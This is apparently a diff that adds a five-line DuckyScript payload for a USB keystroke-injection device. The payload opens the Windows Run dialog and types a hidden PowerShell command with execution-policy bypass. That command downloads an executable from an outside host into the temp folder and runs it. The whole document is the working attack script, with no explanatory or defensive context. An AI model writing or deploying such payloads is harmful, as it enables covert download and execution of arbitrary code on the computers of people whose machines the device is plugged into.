@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http://my.server/calc.exe',\"$env:temp\calc.exe\"); Start-Process \"$env:temp\calc.exe\""
+ENTER
